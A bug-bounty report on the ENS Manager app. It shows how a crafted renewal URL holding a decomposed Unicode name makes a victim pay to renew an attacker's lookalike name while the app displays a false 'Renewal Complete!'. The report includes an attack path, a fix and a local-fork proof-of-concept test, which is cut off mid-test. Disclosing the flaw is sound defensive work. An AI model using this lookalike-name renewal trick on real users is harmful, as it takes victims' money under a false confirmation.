# 92971 w a critical manager falsely confirms a canonical ens renewal while extending an attacker owned raw unicode name

**Submitted on Sep 13th 2026 at 15:02:44 UTC by @Paludo0x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92971
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The ENS Manager single-name renewal route can validate and display the expiry of one ENS name while preparing a paid renewal for a different, attacker-owned name.

The route accepts noncanonical Unicode and keeps its raw label for pricing and transaction construction. Its expiry lookup independently applies ENS normalization. For example, these labels render identically but are different contract identities:

* raw NFD: `cafe\u0301.eth`
* canonical NFC: `caf\u00e9.eth`

If the victim owns the canonical name and the attacker owns the raw name, a crafted raw-NFD renewal URL loads the victim's canonical expiry. The confirmation flow then submits `ETHRegistrar.renew()` with the attacker's raw label. The connected victim pays the fee, the attacker's registration is extended, and the victim's registration is unchanged.

After that transaction succeeds, Manager displays `Renewal Complete!` and calculates the displayed new expiry as the victim's canonical `currentExpiry + duration`. That date does not exist on the canonical registration. The victim therefore receives an explicit success confirmation for the wrong on-chain result.

The attached PoC executes the real renewal route loader and success components, the real transaction-manager renewal actor, and the deployed Sepolia contracts through a pinned local Anvil fork.

## Vulnerability Details

The vulnerability is an inconsistent identity boundary between the route's validation/read path and its transaction/write path.

`parseName()` names a variable `normalized`, but it only trims and lowercases. It does not perform ENSIP-15 normalization and returns the original Unicode composition:

```typescript
// apps/manager/src/features/register-v2/utils/name-parser.ts:45-46,67-81
const normalized = name.trim().toLowerCase()

const label = labels.pop()

return ok({
  subLabels: labels,
  label,
  tld,
})
```

The single-name renewal route parses that raw value, but passes the original full name to `profileExpiryQuery()`:

```typescript
// apps/manager/src/routes/renew/$name.tsx:19-27,60-63
const parsedName = parseRenewableName(name)

const expiryData = await queryClient.ensureQueryData(
  profileExpiryQuery(name),
)

return {
  label: parsedName.value.label,
  currentExpiry: expiryData.expiry,
}
```

The profile expiry service applies `viem/ens.normalize()` before its owner and expiry reads:

```typescript
// apps/manager/src/features/profile/service/profileName.ts:14-18,35-39
export const normalizeEthName = (name: string): EthName | null => {
  let normalized: string

  try {
    normalized = normalize(name)
  // ...
  return {
    leafLabel,
    name: normalized,
    parentLabelsRootFirst: labels.slice(1, -1).reverse(),
  }
}
```

```typescript
// apps/manager/src/features/profile/service/profileExpiry.ts:73-78,87-108
export const getExpiry = ResultFn(async function* (
  name: string,
  protocol?: ProfileProtocol,
) {
  const ethName = normalizeEth2LdName(name)

  const resolvedProtocol =
    protocol ?? (yield* getOwner({ name: ethName.name }))?.protocol ?? 'v2'

  const expiry = yield* fromPromise(
    ensjsv2_getExpiry(client, {
      name: ethName.name,
      registryAddress: ENS_REGISTRY,
    }),
```

Consequently, an NFD route parameter such as `cafe\u0301.eth` is checked against the NFC registration `caf\u00e9.eth`. If that canonical name exists and is renewable, the route passes its guards and returns the canonical registration's expiry together with the raw NFD label.

The confirmation page carries that raw label into both pricing and the state-machine submission while displaying an expiry derived from the canonical read:

```typescript
// apps/manager/src/features/renew/workflow/pricing/components/ConfirmPurchase.tsx:13-22,51-72
const { label, uiActor, protocol } = useRenewalUiContext()

const pricingQuery = useQuery({
  ...getRenewPriceQueryOptions(label, duration, selectedToken, protocol),
  // ...
})

<ConfirmPurchaseBase
  label={label}
  // ...
  onNext={() => {
    uiActor.send({
      type: 'renewal.start',
      label,
      // ...
    })
  }}
/>
```

The renewal state machine forwards the raw label unchanged:

```typescript
// apps/manager/src/features/renew/state/renewalUi.machine.ts:341-356
submittingPlainRenewal: {
  invoke: {
    src: 'submitRenewal',
    input: ({ context }) => {
      const submission = requireSubmissionData(context.submissionData)
      return {
        label: submission.label,
        duration: submission.duration,
        selectedToken: submission.token,
        signer: submission.signer,
        publicClient,
        renewerAddress: context.renewerAddress,
      }
    },
```

Finally, `submitRenewActor()` passes the label to `encodeRenewData()`. That helper removes only a literal `.eth` suffix and does not normalize before ABI encoding:

```typescript
// packages/transaction-manager/src/machines/registration/registration.actors.ts:1020-1031
function encodeRenewData(
  label: string,
  duration: bigint,
  paymentToken: Address,
): Hash {
  const cleanLabel = label.replace('.eth', '')
  return encodeFunctionData({
    abi: ethRegistrarRenewSnippet,
    functionName: 'renew',
    args: [cleanLabel, duration, paymentToken, REFERER_ADDRESS],
  })
}
```

The registrar hashes raw label bytes. NFC and NFD therefore address separate registrations even though the Manager renders them identically.

The success state does not reconcile the transaction label with the expiry identity. It renders an unconditional success banner and computes the displayed date from the canonical expiry originally returned by the loader:

```typescript
// apps/manager/src/features/renew/workflow/renewing/components/
// RenewalCompletionBanner.tsx:12-17
<p className="font-medium text-ens-peridot-text-dark text-sm leading-5">
  <Trans>Renewal Complete!</Trans>
</p>
<p className="text-ens-peridot-text-medium text-sm leading-5">
  <Trans>The ENS domain has been successfully renewed.</Trans>
</p>
```

```typescript
// apps/manager/src/features/renew/workflow/renewing/components/
// RenewalDetails.tsx:23-32,49-52,103-109
const expirationDate = useMemo(() => {
  if (!currentExpiry || !submissionData?.duration) return

  return getDurationExpiryDateForDisplay(
    Number(submissionData.duration),
    new Date(Number(currentExpiry) * 1000),
  )
}, [currentExpiry, submissionData?.duration])

<DomainCard domainName={`${submissionData.label}.eth`} variant="garnet" />

<p className="text-base text-ens-blue">
  {expirationDate ? format(expirationDate, 'MMMM d, yyyy') : ''}
</p>
```

The card renders the raw label, which is canonically equivalent and visually identical to the victim's NFC label, while the date is derived from the victim's canonical registration. Neither value tells the victim that a separate raw registration was renewed.

These values are not synthetic relationships invented by the UI test. The production route passes its loader output directly into `RenewalPage`, which passes the same `label` and `currentExpiry` into `RenewalUiProvider`; the provider then exposes them verbatim to the success components:

```typescript
// apps/manager/src/routes/renew/$name.tsx:60-72
return {
  label: parsedName.value.label,
  currentExpiry: expiryData.expiry,
}

// ...
<RenewalPage currentExpiry={currentExpiry} label={label} protocol="v2" />
```

```typescript
// apps/manager/src/features/renew/workflow/RenewalPage.tsx:21-28
<RenewalUiProvider
  currentExpiry={currentExpiry}
  label={label}
  protocol={protocol}
>
  <RenewalPageContent />
</RenewalUiProvider>
```

```typescript
// apps/manager/src/features/renew/state/renewalUi.context.tsx:52-56
<RenewalUiContext.Provider
  value={{ uiActor, label, currentExpiry, protocol }}
>
  {children}
</RenewalUiContext.Provider>
```

No component under `apps/manager/src/features/renew/` calls `normalize` or `beautify`, and the workflow displays no warning that the route label was noncanonical. Once the raw label leaves the loader, it reaches pricing, confirmation, success rendering, and transaction construction without an identity check.

## Step-by-step Vulnerability Explanation

1. `parseRenewableName()` accepts a noncanonical NFD `.eth` label and preserves its raw code points.
2. `/renew/$name` asks `profileExpiryQuery()` to load the name's current protocol and expiry.
3. `profileExpiryQuery()` normalizes the NFD name to NFC before reading owner and expiry.
4. The route therefore validates the victim-owned canonical name and obtains its expiry.
5. The route combines that canonical expiry with the original raw NFD label.
6. The pricing and confirmation components display the visually identical raw label and derive dates from the canonical expiry.
7. The renewal machine forwards the raw label without normalization.
8. `submitRenewActor()` calls `encodeRenewData()`, which ABI-encodes `renew(rawNfdLabel, duration, token, referrer)`.
9. The registrar pulls the fee from the connected victim and extends the raw NFD registration.
10. The canonical registration whose expiry passed the route guard remains unchanged.
11. Manager enters its success state, displays `Renewal Complete!`, and shows a new expiry computed from the unchanged canonical expiry plus the purchased duration.

This violates the required invariant that the identity used for eligibility and displayed expiry must be byte-identical to the identity encoded in the state-changing transaction.

## Attack Path

1. The victim owns the canonical name `caf\u00e9.eth`.
2. The attacker registers the separate NFD label `cafe\u0301.eth` directly through the registrar. No privileged role is required.
3. The attacker sends the victim a crafted Manager link containing the NFD path parameter, for example `/renew/cafe%CC%81.eth`.
4. The Manager normalizes the name only for the expiry lookup and loads the victim's canonical registration.
5. The application presents a renewal for a name that renders as `café.eth`, using the canonical registration's current expiry.
6. The victim chooses a duration, confirms, and approves the normal USDC approval/renewal wallet prompts.
7. The Manager submits a renewal containing the raw NFD label.
8. The victim pays, but the attacker's raw registration receives the purchased extension. The victim's canonical registration receives no extension.
9. Manager nevertheless reports that the domain was successfully renewed and displays the victim's canonical expiry plus the selected duration.

The attacker needs only ownership of the raw label and the ability to send a link. The attacker does not need browser access, wallet access, leaked credentials, administrator rights, governance privileges, or a race condition. User interaction and wallet approval are required.

## Impact Details

The selected Critical program impact is the category covering an application that displays or pre-fills an incorrect name or transaction detail and thereby causes an unintended transaction.

A secondary applicable Critical category is malicious interaction with an already-connected wallet through modification of transaction arguments or parameters. Here the attacker-controlled raw route identity becomes the `label` argument approved by the connected victim. The primary form selection should remain the more specific incorrect-name/unintended-transaction category.

Measured consequences from the pinned local-fork PoC:

* The victim paid `3,945,216` token base units, equal to `3.945216 USDC`.
* The victim's canonical registration expiry changed by `0` seconds.
* The attacker-owned raw registration expiry increased by `15,552,000` seconds, equal to 180 days.
* The submitted calldata was produced by the real `submitRenewActor()` from the audited transaction-manager.
* The real Manager success components displayed `Renewal Complete!` and a new date calculated from the canonical registration's old expiry plus the 180-day duration.

The payment is collected by the registrar, not transferred directly to the attacker. The attacker receives the economic benefit: additional registration time for the name they own. The report therefore relies on the explicit wrong-name/unintended-transaction impact, not on a claim that the attacker directly receives the USDC.

The amount at risk is the renewal amount selected by the victim. It varies with label pricing and duration. The vulnerability does not itself impose a value cap.

There is also a conditional follow-on risk. Because Manager explicitly confirms success and shows a future expiry that the canonical registration never received, the victim may not attempt another renewal. If the victim takes no corrective action, the canonical name can later pass through expiry and grace period and become registrable by any account, including the attacker. This report does not treat that future takeover as already demonstrated or inevitable; the measured Critical impact is the paid wrong-name transaction and its false success confirmation.

## Known-Issue Distinction

This report acknowledges `EXP-INPUT-005: ENS name validators accept deceptive characters`.

It does not claim that the mere acceptance of a noncanonical Unicode input is new. `EXP-INPUT-005` describes inputs that normalization later rejects or transforms, but states that its practical impact is homograph-style display confusion rather than an incorrect resolution.

The NFD and NFC examples here are not two unrelated homoglyphs: they are canonically equivalent Unicode representations of the same rendered text. The security defect is the use of two different byte identities inside one renewal workflow—canonical for validation and expiry, raw for the state-changing transaction.

More precisely, two independent functions derive the validated identity and the transaction identity, and their outputs are never compared:

* `normalizeEth2LdName()` produces the canonical identity used by `getExpiry()`.
* `encodeRenewData()` preserves the raw identity used by `ETHRegistrar.renew()`.

Validator acceptance is a prerequisite, but it is not the complete state-changing root cause. A display-only remediation for deceptive characters would not enforce that the name validated before confirmation is the name encoded after confirmation. The missing cross-boundary identity invariant is what converts the accepted input into a paid transaction for another registration.

This report demonstrates the materially different state-changing consequence that the known issue does not establish: one workflow uses the canonical identity for eligibility and expiry, then uses the raw identity for pricing and calldata. The attached local-contract PoC proves a victim token charge and extension of an attacker-owned registration while the validated canonical registration remains unchanged.

The competition's known-issue policy states that a new consequence of a listed root cause remains in scope when it materially changes severity. Moving from display confusion to a paid wrong-name transaction maps to an explicit Critical impact and materially changes the consequence.

This finding is also distinct from the previously submitted stale bulk-renewal issue. That issue is an ownership and registration-epoch race after expiry. This report concerns deterministic Unicode identity divergence in the single-name route and does not require an ownership transition, stale query, grace-period boundary, or replacement registration.

## Recommended Fix

Normalize once at the route boundary and use the canonical result as the sole identity throughout the workflow:

1. Apply ENSIP-15 normalization before parsing or accepting a renewable name.
2. Reject the route if normalization fails.
3. Carry the canonical label through owner/expiry reads, pricing, displayed dates, transaction descriptions, allowance checks, query invalidation, and calldata generation.
4. Normalize defensively again in the transaction manager or require a branded canonical-label type.
5. Add an invariant test asserting that the label used by `profileExpiryQuery()` is byte-identical to the label decoded from `ETHRegistrar.renew()` calldata.

For example:

```typescript
const canonicalName = normalize(name)
const parsedName = parseRenewableName(canonicalName)

// Use parsedName.value.label for every read, display, and transaction sink.
```

## Proof of Concept

### PoC Explanation

The submission contains one self-contained test file: `unicode-renewal.single-file.poc.test.ts`.

Its three tests execute the entire evidence chain:

1. It invokes the audited `/renew/$name` loader and proves that the loader passes the raw name to `profileExpiryQuery()` and returns the raw NFD label alongside the expiry result supplied by that query. Because the query boundary is mocked for determinism, this test does not alone prove where the expiry originated. The same test separately executes the production `normalizeEth2LdName()` helper used inside the real profile-expiry service and proves that the raw NFD input maps to the canonical NFC identity. The cited production call chain connects that normalizer to the on-chain expiry read.
2. It renders the real `RenewSuccessStep`, `RenewalCompletionBanner`, and `RenewalDetails` components and asserts the false success banner, raw displayed name, and canonical-derived future expiry.
3. It registers canonical and raw labels as separate names owned by the victim and attacker, obtains calldata from the real `submitRenewActor()`, decodes and verifies the raw renewal label, submits exactly that request to a pinned local Sepolia fork, and asserts the victim's balance and both expiries.

The first two tests require no chain and establish the application-layer mismatch and false success display. The third requires the pinned Anvil node at `127.0.0.1:18545`; it establishes that the application-generated transaction succeeds and produces the claimed financial and state consequences.

### PoC Environment

| Property                  | Exact value                                                                                                                    |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Audited upstream revision | `63772fd872af472ced58b009499355f3430c2a86`                                                                                     |
| Competition base commit   | `cda79acaad59711b943fc68207ebb3f1d0ff8596`                                                                                     |
| Competition base tree     | `8e0d79dac1ab4b4fdb80d6afed810087ae9f00ba`                                                                                     |
| Tested competition HEAD   | `1c9b47f18fcddd2e864dfe385c4171061c9811ae`                                                                                     |
| Tested HEAD tree          | `fd2fa034e987dd81c4a170b3e8370e6edf2a3376`                                                                                     |
| Relevant-file comparison  | Every production source file cited in the mechanism and UI path is byte-identical between the competition base and tested HEAD |
| Runtime                   | Node 22, pnpm 10, Vitest 4.1.5                                                                                                 |
| Chain                     | Local Anvil fork of Sepolia; no public-chain writes                                                                            |
| Fork block                | `11696208`                                                                                                                     |
| Chain ID                  | `11155111`                                                                                                                     |
| Fixed local RPC           | `http://127.0.0.1:18545`                                                                                                       |
| Anvil image               | `ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd`                           |
| External systems modified | None                                                                                                                           |

The competition HEAD contains a Hono dependency merge after the competition base. Its diff changes only `apps/manager/package.json`, `packages/dqa-server/package.json`, `workers/api-worker/package.json`, and `pnpm-lock.yaml`; none of the production source files cited by this report changed.

The PoC calls `anvil_setCode` only on the disposable fork to clear code found at deterministic Anvil account addresses in the forked Sepolia state. This makes those local test accounts behave as EOAs for the registrar's ERC-1155 safe-mint check. It does not alter the registrar, registry, token, pricing, label handling, or any public-chain state.

### Setup

Install the audited repository dependencies as documented by the program:

```bash
git clone --branch audit-comp-ready https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
corepack enable
pnpm install --frozen-lockfile
```

Place the single attached PoC file at this exact path:

```
apps/manager/src/features/renew/unicode-renewal.single-file.poc.test.ts
```

### Run the Single-File PoC

Start the same pinned Anvil release and fork block used for the observed result:

```bash
docker run -d --rm \
  --name ens-unicode-poc-anvil \
  -p 127.0.0.1:18545:8545 \
  --entrypoint anvil \
  ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd \
  --fork-url https://ethereum-sepolia-rpc.publicnode.com \
  --fork-block-number 11696208 \
  --chain-id 11155111 \
  --port 8545 \
  --host 0.0.0.0
```

Run the single PoC file. Manager's Vitest configuration replaces `process.env`, so the PoC intentionally uses the fixed endpoint `http://127.0.0.1:18545` and does not accept an `ANVIL_RPC_URL` override. This one command executes all application, calldata, payment, and contract-state assertions:

```bash
pnpm --filter manager test \
  src/features/renew/unicode-renewal.single-file.poc.test.ts
```

Stop the local node after the test:

```bash
docker stop ens-unicode-poc-anvil
```

Tests 1 and 2 do not contact the chain. Test 3 requires Anvil; if it is not running, the first two can pass while the third fails at its explicit chain-ID check. The test can also emit unrelated Manager test-environment logs during import or teardown. These do not affect the assertions or exit status.

### Observed Output

The pinned single-file run completed successfully:

```
ENS Manager Unicode renewal identity mismatch — single-file PoC
  ✓ combines canonical expiry with the raw NFD label in the real route loader
  ✓ shows a false renewal success and canonical-derived future expiry
  ✓ charges the victim and extends only the attacker raw label on the local fork

Test Files  1 passed (1)
Tests       3 passed (3)
```

The test printed these measured values:

```json
{
  "rawLabel": "café-poc-11696208",
  "canonicalLabel": "café-poc-11696208",
  "rawLabelCodePoints": "0063 0061 0066 0065 0301 002d 0070 006f 0063 002d 0031 0031 0036 0039 0036 0032 0030 0038",
  "canonicalLabelCodePoints": "0063 0061 0066 00e9 002d 0070 006f 0063 002d 0031 0031 0036 0039 0036 0032 0030 0038",
  "rawLabelhash": "0xb675dd8b07bd6be304875cdcac0b71621efbe1487227fe2bb65747155d2f7e63",
  "canonicalLabelhash": "0x5b17d36f768cff59d292072942f2582b255cb9871cc25cf583490dc346430ec1",
  "encodedRenewLabel": "café-poc-11696208",
  "victimPaid": "3945216",
  "canonicalExpiryDelta": "0",
  "attackerRawExpiryDelta": "15552000"
}
```

The result proves that the victim pays, the canonical registration validated by the route receives no time, and the attacker-owned raw registration receives the full purchased duration.

```
/**
 * Single-file PoC for the ENS Manager Unicode renewal identity mismatch.
 *
 * Place at:
 *   apps/manager/src/features/renew/unicode-renewal.single-file.poc.test.ts
 *
 * Setup:
 *   git clone --branch audit-comp-ready \
 *     https://github.com/immunefi-team/audit-comp-ens.git
 *   cd audit-comp-ens
 *   git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
 *   corepack enable
 *   pnpm install --frozen-lockfile
 *
 * Start the pinned local fork (all writes remain local):
 *   docker run -d --rm --name ens-unicode-poc-anvil \
 *     -p 127.0.0.1:18545:8545 --entrypoint anvil \
 *     ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd \
 *     --fork-url https://ethereum-sepolia-rpc.publicnode.com \
 *     --fork-block-number 11696208 --chain-id 11155111 \
 *     --port 8545 --host 0.0.0.0
 *
 * Tests 1 and 2 are application-only. Test 3 requires Anvil at the fixed
 * loopback address above. Run all three with:
 *   pnpm --filter manager test \
 *     src/features/renew/unicode-renewal.single-file.poc.test.ts
 *
 * Cleanup:
 *   docker stop ens-unicode-poc-anvil
 */

import '@testing-library/jest-dom'
import { i18n } from '@lingui/core'
import { I18nProvider } from '@lingui/react'
import { render, screen } from '@testing-library/react'
import { permissionedRegistryGetExpirySnippet } from '@ensdomains/ensjs-abi/v2'
import {
  ethRegistrarCommitSnippet,
  ethRegistrarGetRegisterPriceSnippet,
  ethRegistrarMakeCommitmentSnippet,
  ethRegistrarRegisterSnippet,
  ethRegistrarRenewSnippet,
} from '@ensdomains/ensjs-abi/v2/ethRegistrar'
import { format } from 'date-fns'
import { createElement } from 'react'
import {
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeFunctionData,
  encodeFunctionData,
  http,
  keccak256,
  labelhash,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
  type Address,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { normalize } from 'viem/ens'
import { sepolia } from 'viem/chains'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { getDurationExpiryDateForDisplay } from '@/features/register-v2/utils/time'
import { normalizeEth2LdName } from '@/features/profile/service/profileName'
import { getRenewPriceQueryOptions } from '@/features/renew/data/queries/renewPricing.query'
import { parseRenewableName } from '@/features/renew/utils/renewableName'
import { RenewSuccessStep } from '@/features/renew/workflow/result/SuccessStep'
import { Route } from '@/routes/renew/$name'
import {
  ENS_SEPOLIA_CONTRACTS,
  TOKENS,
} from '../../../../../packages/transaction-manager/src/contracts/ens-sepolia'
import { submitRenewActor } from '../../../../../packages/transaction-manager/src/machines/registration/registration.actors'
import type { EOASigner } from '../../../../../packages/transaction-manager/src/types/signer.types'
import type { EoaTransactionRequest } from '../../../../../packages/transaction-manager/src/types/transaction.types'

const harness = vi.hoisted(() => ({
  rawLabel: 'cafe\u0301',
  canonicalLabel: 'caf\u00e9',
  canonicalExpiry: BigInt(
    Math.floor(new Date('2030-01-01T00:00:00.000Z').getTime() / 1000),
  ),
  renewalDuration: 180n * 24n * 60n * 60n,
  profileExpiryQuery: vi.fn((name: string) => ({
    queryKey: ['profile-expiry', name],
  })),
  request: undefined as EoaTransactionRequest | undefined,
}))

vi.mock('@tanstack/react-router', () => ({
  createFileRoute: () => (options: Record<string, unknown>) => ({ options }),
  redirect: (options: unknown) => ({ options }),
}))

vi.mock('@/features/profile/service/profileExpiry', async (importOriginal) => {
  const actual = await importOriginal<
    typeof import('@/features/profile/service/profileExpiry')
  >()
  return {
    ...actual,
    profileExpiryQuery: harness.profileExpiryQuery,
  }
})

vi.mock('@/features/renew/workflow/RenewalPage', () => ({
  RenewalPage: () => null,
}))

vi.mock('@/features/renew/workflow/components/RenewalRouteError', () => ({
  RenewalRouteError: () => null,
}))

vi.mock('@/features/renew/state/renewalUi.context', () => ({
  useRenewalUiContext: () => ({
    uiActor: {},
    label: harness.rawLabel,
    currentExpiry: harness.canonicalExpiry,
    protocol: 'v2',
  }),
}))

vi.mock('@xstate/react', () => ({
  useSelector: (
    _actor: unknown,
    selector: (state: {
      context: { submissionData: Record<string, unknown> }
      matches: (value: string) => boolean
    }) => unknown,
  ) =>
    selector({
      context: {
        submissionData: {
          label: harness.rawLabel,
          duration: harness.renewalDuration,
          priceNumber: 3.945216,
        },
      },
      matches: (value) => value === 'success',
    }),
}))

vi.mock('@/components/atoms/DomainCard/DomainCard', () => ({
  DomainCard: ({ domainName }: { domainName: string }) => domainName,
}))

vi.mock('@/components/ui/button', () => ({
  LinkButton: ({ children }: { children: unknown }) => children,
}))

vi.mock('@/features/register-v2/data/queries/baseRates.query', () => ({
  useBaseRate: () => 1,
}))

vi.mock('@/features/register-v2/utils/discount', () => ({
  calculateDiscount: () => ({
    discountAmount: 0,
    discountPercentage: 0,
    basePriceWithoutDiscount: 3.945216,
  }),
}))

vi.mock(
  '../../../../../packages/transaction-manager/src/providers/transactionManager',
  () => ({
    transactionManager: {
      startTransaction: (input: { request: EoaTransactionRequest }) => {
        harness.request = input.request
        return 'unicode-renewal-single-file-poc'
      },
    },
  }),
)

i18n.loadAndActivate({ locale: 'en', messages: {} })

const rawName = `${harness.rawLabel}.eth`
const canonicalName = `${harness.canonicalLabel}.eth`

type RenewalLoader = (input: {
  params: { name: string }
  context: {
    queryClient: {
      ensureQueryData: (options: unknown) => Promise<{
        expiry: bigint
        isNonExpiring: boolean
        protocol: 'v2'
      }>
    }
  }
}) => Promise<{ label: string; currentExpiry: bigint }>

// Manager's Vitest config replaces process.env, so use one explicit endpoint.
// This avoids silently ignoring an ANVIL_RPC_URL override.
const rpcUrl = 'http://127.0.0.1:18545'
const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [rpcUrl] } },
} as const
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })

const funder = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const victim = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const attacker = privateKeyToAccount(
  '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a',
)

const walletFor = (account: typeof funder) =>
  createWalletClient({ account, chain, transport })

const registrar = ENS_SEPOLIA_CONTRACTS.ETHRegistrar
const registry = ENS_SEPOLIA_CONTRACTS.ETHRegistry
const paymentToken = TOKENS.USDC.address
const registrationDuration = 365n * 24n * 60n * 60n

const erc20Abi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
])
const minCommitmentAgeAbi = parseAbi([
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])

async function send(
  account: typeof funder,
  to: Address,
  data: `0x${string}`,
) {
  const hash = await walletFor(account).sendTransaction({ account, to, data })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return hash
}

async function register(label: string, owner: typeof funder) {
  // This changes only the disposable local fork. Deterministic Anvil account
  // addresses can have code on Sepolia, so clear it before ERC-1155 safe-mint.
  await testClient.setCode({ address: owner.address, bytecode: '0x' })

  await send(
    funder,
    paymentToken,
    encodeFunctionData({
      abi: erc20Abi,
      functionName: 'mint',
      args: [owner.address, 10_000_000_000n],
    }),
  )

  const secret = keccak256(toHex(`unicode-renewal:${label}`))
  const commitment = await publicClient.readContract({
    address: registrar,
    abi: ethRegistrarMakeCommitmentSnippet,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      zeroAddress,
      registrationDuration,
      zeroHash,
    ],
  })
  await send(
    owner,
    registrar,
    encodeFunctionData({
      abi: ethRegistrarCommitSnippet,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minAge = await publicClient.readContract({
    address: registrar,
    abi: minCommitmentAgeAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: ethRegistrarGetRegisterPriceSnippet,
    functionName: 'getRegisterPrice',
    args: [label, registrationDuration, paymentToken],
  })
  await send(
    owner,
    paymentToken,
    encodeFunctionData({
      abi: erc20Abi,
      functionName: 'approve',
      args: [registrar, (base + premium) * 2n],
    }),
  )
  await send(
    owner,
    registrar,
    encodeFunctionData({
      abi: ethRegistrarRegisterSnippet,
      functionName: 'register',
      args: [
        label,
        owner.address,
        secret,
        zeroAddress,
        zeroAddress,
        registrationDuration,
        paymentToken,
        zeroHash,
      ],
    }),
  )
}

const expiryOf = (label: string) =>
  publicClient.readContract({
    address: registry,
    abi: permissionedRegistryGetExpirySnippet,
    functionName: 'getExpiry',
    args: [BigInt(labelhash(label))],
  })

const codePoints = (value: string) =>
  Array.from(value)
    .map((character) =>
      character.codePointAt(0)!.toString(16).padStart(4, '0'),
    )
    .join(' ')

describe('ENS Manager Unicode renewal identity mismatch — single-file PoC', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    harness.request = undefined
  })

  it('combines canonical expiry with the raw NFD label in the real route loader', async () => {
    const parsed = parseRenewableName(rawName)
    expect(parsed.isOk()).toBe(true)
    if (parsed.isErr()) throw parsed.error

    expect(parsed.value.label).toBe(harness.rawLabel)
    expect(normalizeEth2LdName(rawName)).toEqual({
      label: harness.canonicalLabel,
      name: canonicalName,
    })

    const ensureQueryData = vi.fn().mockResolvedValue({
      expiry: harness.canonicalExpiry,
      isNonExpiring: false,
      protocol: 'v2' as const,
    })
    const loader = Route.options.loader as RenewalLoader
    const result = await loader({
      params: { name: rawName },
      context: { queryClient: { ensureQueryData } },
    })

    expect(harness.profileExpiryQuery).toHaveBeenCalledWith(rawName)
    expect(result).toEqual({
      label: harness.rawLabel,
      currentExpiry: harness.canonicalExpiry,
    })
    expect(
      getRenewPriceQueryOptions(
        result.label,
        harness.renewalDuration,
        'USDC',
        'v2',
      ).queryKey,
    ).toEqual([expect.objectContaining({ label: harness.rawLabel })])
  })

  it('shows a false renewal success and canonical-derived future expiry', () => {
    render(
      createElement(
        I18nProvider,
        { i18n },
        createElement(RenewSuccessStep),
      ),
    )

    const displayedExpiry = getDurationExpiryDateForDisplay(
      Number(harness.renewalDuration),
      new Date(Number(harness.canonicalExpiry) * 1000),
    )

    expect(screen.getByText('Renewal Complete!')).toBeInTheDocument()
    expect(
      screen.getByText('The ENS domain has been successfully renewed.'),
    ).toBeInTheDocument()
    expect(screen.getByText(rawName)).toBeInTheDocument()
    expect(screen.getByText(format(displayedExpiry, 'MMMM d, yyyy')))
      .toBeInTheDocument()
  })

  it('charges the victim and extends only the attacker raw label on the local fork', async () => {
    // Tests 1 and 2 can pass without a chain. Fail test 3 clearly if the
    // reviewer did not start the pinned Anvil command from the file header.
    expect(await publicClient.getChainId()).toBe(11155111)

    const suffix = (await publicClient.getBlockNumber()).toString()
    const contractRawLabel = `cafe\u0301-poc-${suffix}`
    const contractCanonicalLabel = normalize(`${contractRawLabel}.eth`).slice(
      0,
      -4,
    )

    expect(contractCanonicalLabel).toBe(`caf\u00e9-poc-${suffix}`)
    expect(labelhash(contractRawLabel)).not.toBe(
      labelhash(contractCanonicalLabel),
    )

    await register(contractCanonicalLabel, victim)
    await register(contractRawLabel, attacker)

    const canonicalBefore = await expiryOf(contractCanonicalLabel)
    const rawBefore = await expiryOf(contractRawLabel)

    const renewPrice = await publicClient.readContract({
      address: registrar,
      abi: parseAbi([
        'function getRenewPrice(string label, uint64 duration, address paymentToken) view returns (uint256)',
      ]),
      functionName: 'getRenewPrice',
      args: [contractRawLabel, harness.renewalDuration, paymentToken],
    })
    await send(
      victim,
      paymentToken,
      encodeFunctionData({
        abi: erc20Abi,
        functionName: 'approve',
        args: [registrar, renewPrice * 2n],
      }),
    )
    const victimBalanceBefore = await publicClient.readContract({
      address: paymentToken,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [victim.address],
    })

    const signer = {
      type: 'eoa',
      walletClient: walletFor(victim),
    } satisfies EOASigner
    const result = await submitRenewActor({
      label: contractRawLabel,
      duration: harness.renewalDuration,
      selectedToken: 'USDC',
      signer,
      publicClient,
    })
    expect(result.isOk()).toBe(true)
    expect(harness.request?.to).toBe(registrar)
    expect(harness.request?.data).toBeDefined()

    const decoded = decodeFunctionData({
